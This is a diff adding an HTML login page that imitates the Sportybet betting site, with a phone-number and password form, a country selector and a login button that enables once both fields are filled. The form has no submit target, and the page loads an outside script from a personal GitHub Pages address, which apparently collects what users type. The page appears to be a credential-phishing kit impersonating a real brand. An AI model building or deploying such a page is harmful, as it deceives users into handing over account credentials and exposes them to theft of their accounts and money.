@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login to Sportybet</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  background:#0f1723;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:#fff;
+}
+
+/* ===== CONTAINER ===== */
+.login-container{
+  width:92%;
+  max-width:380px;
+  background:#121a29;
+  border-radius:8px;
+  padding:20px 18px 24px;
+  position:relative;
+}
+
+/* ===== COUNTRY BAR ===== */
+.country-bar{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:18px;
+}
+
+.country-left{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  font-size:14px;
+}
+
+.flag{
+  width:22px;
+  height:14px;
+  background:linear-gradient(90deg,#008751 33%, #fff 33%, #fff 66%, #008751 66%);
+  border-radius:2px;
+}
+
+.change{
+  color:#38c172;
+  font-size:14px;
+  cursor:pointer;
+}
+
+.close{
+  font-size:20px;
+  color:#ccc;
+}
+
+/* ===== INPUT BOX ===== */
+.input-box{
+  border:1px solid #1f8f4a;
+  border-radius:4px;
+  overflow:hidden;
+  margin-bottom:14px;
+  display:flex;
+}
+
+.input-box.dark{
+  border:1px solid #2b3346;
+}
+
+.input-box span{
+  background:#0f1723;
+  padding:12px;
+  color:#bbb;
+  font-size:14px;
+}
+
+.input-box input{
+  border:none;
+  outline:none;
+  background:#0f1723;
+  color:#fff;
+  padding:12px;
+  flex:1;
+  font-size:15px;
+  width:100%;
+}
+
+/* ===== CHECKBOX ROW ===== */
+.checkbox-row{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin:12px 0 18px;
+  font-size:13px;
+  color:#ccc;
+}
+
+.checkbox-row label{
+  display:flex;
+  align-items:center;
+  gap:6px;
+}
+
+.checkbox-row input{
+  accent-color:#38c172;
+}
+
+/* ===== LOGIN BUTTON ===== */
+.login-btn{
+  width:100%;
+  padding:13px;
+  background:#3a4456;
+  border:none;
+  color:#aaa;
+  border-radius:4px;
+  font-size:16px;
+  cursor:not-allowed;
+}
+
+.login-btn.active{
+  background:#38c172;
+  color:#fff;
+  cursor:pointer;
+}
+
+/* ===== TERMS ===== */
+.terms{
+  font-size:12px;
+  color:#aaa;
+  margin:14px 0 18px;
+}
+
+.terms span{
+  color:#38c172;
+}
+
+/* ===== LINKS ===== */
+.links{
+  display:flex;
+  justify-content:space-between;
+  font-size:14px;
+}
+
+.links a{
+  color:#38c172;
+  text-decoration:none;
+}
+
+/* ===== DIVIDER ===== */
+.or-line{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin:20px 0;
+  color:#888;
+}
+
+.or-line span{
+  flex:1;
+  height:1px;
+  background:#333;
+}
+
+/* ===== FOOT TEXT ===== */
+.footer-text{
+  font-size:13px;
+  text-align:center;
+  color:#aaa;
+}
+
+.footer-text span{
+  color:#38c172;
+}
+
+/* ================= COUNTRY MODAL ================= */
+.modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:999;
+}
+
+.modal-box{
+  background:#121a29;
+  width:90%;
+  max-width:340px;
+  padding:18px;
+  border-radius:8px;
+}
+
+.modal-header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:12px;
+  font-size:18px;
+}
+
+.modal-header span{
+  cursor:pointer;
+  font-size:22px;
+}
+
+.country-option{
+  border:1px solid #333;
+  border-radius:6px;
+  padding:12px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:10px;
+  cursor:pointer;
+}
+
+.country-option.active{
+  border:1px solid #38c172;
+}
+
+.country-left-box{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+</style>
+</head>
+
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="login-container">
+<form>
+  <!-- COUNTRY BAR -->
+  <div class="country-bar">
+    <div class="country-left">
+      <div class="flag" id="selectedFlag"></div>
+      <div id="selectedCountry">Nigeria</div>
+      <div class="change" onclick="openModal()">Change ›</div>
+    </div>
+    <div class="close">×</div>
+  </div>
+
+  <!-- MOBILE INPUT -->
+  <div class="input-box">
+    <span id="dialCode">+234</span>
+    <input type="tel" placeholder="Mobile Number" id="phoneInput" name="Phone number">
+  </div>
+
+  <!-- PASSWORD INPUT -->
+  <div class="input-box dark">
+    <input type="password" placeholder="Password" id="passwordInput" name="Password">
+  </div>
+
+  <!-- CHECKBOX -->
+  <div class="checkbox-row">
+    <label><input type="checkbox" checked> Remember me</label>
+    <label><input type="checkbox" checked> Keep me signed in</label>
+  </div>
+
+  <!-- LOGIN BUTTON -->
+  <button class="login-btn" id="loginBtn" disabled type="submit">Login</button>
+</form>
+  <!-- TERMS -->
+  <div class="terms">
+    By logging in, you agree to our <span>Terms & Conditions</span>
+  </div>
+
+  <!-- LINKS -->
+  <div class="links">
+    <a href="#">Forgot Password?</a>
+    <a href="#">Create New Account</a>
+  </div>
+
+  <!-- OR DIVIDER -->
+  <div class="or-line">
+    <span></span>
+    <div>Or</div>
+    <span></span>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer-text">
+    To deactivate or reactivate your account <span>click here.</span>
+  </div>
+
+</div>
+
+<!-- ===== COUNTRY MODAL ===== -->
+<div class="modal" id="countryModal">
+  <div class="modal-box">
+    <div class="modal-header">
+      Location Preference
+      <span onclick="closeModal()">×</span>
+    </div>
+
+    <div class="country-option active" onclick="selectCountry('Nigeria', '+234', this)">
+      <div class="country-left-box"><div class="flag"></div> Nigeria</div> ✅
+    </div>
+
+    <div class="country-option" onclick="selectCountry('Ghana', '+233', this)">🇬🇭 Ghana</div>
+    <div class="country-option" onclick="selectCountry('Tanzania', '+255', this)">🇹🇿 Tanzania</div>
+    <div class="country-option" onclick="selectCountry('Zambia', '+260', this)">🇿🇲 Zambia</div>
+    <div class="country-option" onclick="selectCountry('South Africa', '+27', this)">🇿🇦 South Africa</div>
+    <div class="country-option" onclick="selectCountry('Kenya', '+254', this)">🇰🇪 Kenya</div>
+
+  </div>
+</div>
+
+<!-- ✅ SCRIPTS -->
+<script>
+function openModal(){
+  document.getElementById("countryModal").style.display="flex";
+}
+
+function closeModal(){
+  document.getElementById("countryModal").style.display="none";
+}
+
+function selectCountry(name, code, el){
+  document.getElementById("selectedCountry").innerText = name;
+  document.getElementById("dialCode").innerText = code;
+
+  document.querySelectorAll(".country-option").forEach(x=>x.classList.remove("active"));
+  el.classList.add("active");
+
+  closeModal();
+}
+
+/* ✅ ENABLE LOGIN BUTTON ONLY WHEN BOTH FIELDS ARE FILLED */
+const phoneInput = document.getElementById("phoneInput");
+const passwordInput = document.getElementById("passwordInput");
+const loginBtn = document.getElementById("loginBtn");
+
+function checkInputs(){
+  if(phoneInput.value.trim() !== "" && passwordInput.value.trim() !== ""){
+    loginBtn.classList.add("active");
+    loginBtn.disabled = false;
+  }else{
+    loginBtn.classList.remove("active");
+    loginBtn.disabled = true;
+  }
+}
+
+phoneInput.addEventListener("input", checkInputs);
+passwordInput.addEventListener("input", checkInputs);
+</script>
+
+</body>
+</html>
